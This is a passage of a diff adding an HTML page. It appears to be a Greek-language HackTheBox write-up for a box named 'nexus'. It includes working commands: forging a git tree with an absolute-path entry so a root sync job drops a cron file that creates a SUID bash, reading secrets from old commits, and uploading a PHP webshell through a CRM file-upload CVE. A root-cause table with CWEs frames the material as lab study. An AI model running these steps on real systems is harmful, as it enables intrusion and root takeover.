+<span class="pd">$ </span><span class="pc">TREE=$(printf '100644 /etc/cron.d/pwncron\0%s' "$PH" \
+     | git hash-object -w -t tree --literally --stdin)</span>
+<span class="pd">$ </span><span class="pc">COMMIT=$(git commit-tree "$TREE" -m pwn)</span>
+<span class="pd">$ </span><span class="pc">git update-ref refs/heads/main "$COMMIT"; git ls-tree -r HEAD</span>
+<span class="pg">100644 blob …  /etc/cron.d/pwncron</span></div>
+  </div>
+
+  <p>Τώρα δημιούργησε ένα repo σαν <code>jones</code>, σήμανέ το <strong>template</strong> (αυτή είναι η σημαία που φιλτράρει το script sync), και κάνε push το πλαστογραφημένο history. Το <code>/tmp/.copybash.sh</code> που αναφέρει το cron απλά αντιγράφει το bash και ορίζει το bit SUID:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">stage payload, create template repo, push</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">printf '#!/bin/bash\ncp /bin/bash /tmp/.rootbash\nchmod 4755 /tmp/.rootbash\n' \
+     &gt; /tmp/.copybash.sh; chmod a+rx /tmp/.copybash.sh</span>
+<span class="pd">$ </span><span class="pc">curl -su jones:$PW -X POST  localhost:3000/api/v1/user/repos   -d '{"name":"pwn"}'</span>
+<span class="pd">$ </span><span class="pc">curl -su jones:$PW -X PATCH localhost:3000/api/v1/repos/jones/pwn -d '{"template":true}'</span>
+<span class="pd">$ </span><span class="pc">git push -f http://jones:$PW@localhost:3000/jones/pwn.git main</span></div>
+  </div>
+
+  <p>Μέσα σε ένα λεπτό το timer root κάνει sync το "template", το <code>os.path.join</code> κάνει resolve το όνομα entry σε <code>/etc/cron.d/pwncron</code>, και ο root το γράφει. Το cron τρέχει το αντίγραφο SUID, και το <code>bash -p</code> κρατά το EUID root:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">root.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">tail -2 /var/log/template-sync.log</span>
+<span class="po">[…] synced: /etc/cron.d/pwncron
+[…] Template sync complete</span>
+<span class="pd">$ </span><span class="pc">ls -l /tmp/.rootbash</span>
+<span class="po">-rwsr-xr-x 1 root root 1446024 /tmp/.rootbash</span>
+<span class="pd">$ </span><span class="pc">/tmp/.rootbash -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=1000(jones) gid=1000(jones) euid=0(root)</span>
+<span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">Το bug δεν είναι το <code>os.path.join</code> — είναι το να εμπιστεύεσαι ένα filename από μη έμπιστη πηγή σαν στόχο εγγραφής. Ένα όνομα tree entry git είναι δεδομένα επιτιθέμενου· το να το ταΐσεις σε ένα path join που ένα αρχικό slash μπορεί να καταλάβει μετατρέπει το "κάνε sync κάποια αρχεία template" σε αυθαίρετο root file-write. Δύο ανεξάρτητοι φρουροί θα το είχαν σταματήσει ο καθένας: ένωση μόνο με το basename (ή απόρριψη absolute/<code>..</code> components μετά την ένωση), και το να τρέχεις το sync σαν unprivileged service account αντί για root.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Γιατί Δούλεψε</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Ριζα του προβληματος</th></tr>
+    <tr><td>→ git .env</td><td>Secret κάνει commit στο version control· το scrubbing του HEAD το αφήνει στο history (CWE-538 / CWE-312)</td></tr>
+    <tr><td>→ admin Krayin</td><td>Επαναχρησιμοποίηση password ανάμεσα στο config DB και τον λογαριασμό admin CRM (CWE-521 / CWE-798)</td></tr>
+    <tr><td>→ www-data</td><td>CVE-2026-38526 — unrestricted file upload, χωρίς έλεγχο τύπου/επέκτασης, μέσα σε web-served φάκελο (CWE-434)</td></tr>
+    <tr><td>→ jones</td><td>Ένα ακόμα επαναχρησιμοποιημένο password που κάθεται στο <code>.env</code> της deployed εφαρμογής (CWE-522)</td></tr>
+    <tr><td>→ root</td><td>Το sync root γράφει σε ένα μη έμπιστο path git tree-entry· ένα απόλυτο path ξεφεύγει από τον φάκελο staging (CWE-22 / CWE-250)</td></tr>
+  </table>
+
+  <h2>Σημειώσεις operator — από macOS</h2>
+
+  <ul>
+    <li><strong>Χωρίς reverse shells.</strong> Ένα scriptable webshell (<code>?c=</code>) κάλυψε το βήμα <code>www-data</code>, και ένα κλειδί SSH κάλυψε τον <code>jones</code> — και τα δύο σταθερά και non-interactive, οπότε τίποτα να προσέχεις σε ένα VPN.</li>
+    <li><strong>Οι κεφαλίδες Host νικούν το churn του <code>/etc/hosts</code>.</strong> Κάθε web request χρησιμοποίησε <code>curl -H "Host: …"</code>, οπότε δεν χρειάστηκε sudo για να δοκιμάσω τα τρία vhosts.</li>
+    <li><strong>Το exploit root είναι git plumbing, όχι tooling.</strong> Τίποτα ειδικό για macOS — τα <code>git hash-object -t tree --literally</code> και <code>commit-tree</code> πλαστογραφούν το object graph πανομοιότυπα παντού· το κόλπο είναι να καταλάβεις ότι το όνομα ενός tree entry είναι απλά ένα string σε ένα blob που μπορείς να γράψεις εσύ.</li>
+    <li><strong>Παλιά secrets ζουν σε παλιές commits.</strong> Τράβα πάντα ευαίσθητα αρχεία στην <em>πρώτη</em> commit, όχι μόνο HEAD — ένα καθαρισμένο <code>.env</code> στην κορυφή είναι η κλασική παραπλάνηση.</li>
+  </ul>
+
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. vhosts → git + billing</span>
+<span class="pc">ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -w dns-Jhaddix.txt -fs 154</span>
+
+<span class="pco"># 2. password από το .env της ΠΡΩΤΗΣ commit (όχι HEAD)</span>
+<span class="pc">curl -s -H "Host: git.nexus.htb" "http://&lt;IP&gt;/admin/krayin-docker-setup/raw/commit/&lt;first-sha&gt;/.env"</span>
+
+<span class="pco"># 3. Krayin CVE-2026-38526: authed upload TinyMCE → webshell</span>
+<span class="pc">curl -b cj -H "Host: billing.nexus.htb" -H "X-CSRF-TOKEN: $T" -F "_token=$T" -F "file=@sh.php;type=image/png" http://&lt;IP&gt;/admin/tinymce/upload</span>
+
+<span class="pco"># 4. .env στον δίσκο → SSH σαν jones (user.txt)</span>
+<span class="pc">curl -H "Host: billing.nexus.htb" "http://&lt;IP&gt;/storage/tinymce/&lt;hash&gt;.php?c=grep+PASS+/var/www/krayin/.env"</span>
+
+<span class="pco"># 5. root: πλαστογράφησε git tree απόλυτου-path → root cron μέσω template-sync</span>
+<span class="pc">BLOB=$(git hash-object -w --stdin &lt; cronfile)</span>
+<span class="pc">TREE=$(printf '100644 /etc/cron.d/pwncron\0%s' "$(echo -n $BLOB|xxd -r -p)" | git hash-object -w -t tree --literally --stdin)</span>
+<span class="pc">git commit-tree $TREE -m x | xargs -I{} git update-ref refs/heads/main {}</span>
+<span class="pc">curl -su jones:$PW -X PATCH localhost:3000/api/v1/repos/jones/pwn -d '{"template":true}'; git push -f http://jones:$PW@localhost:3000/jones/pwn.git main</span>
+<span class="pc">/tmp/.rootbash -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
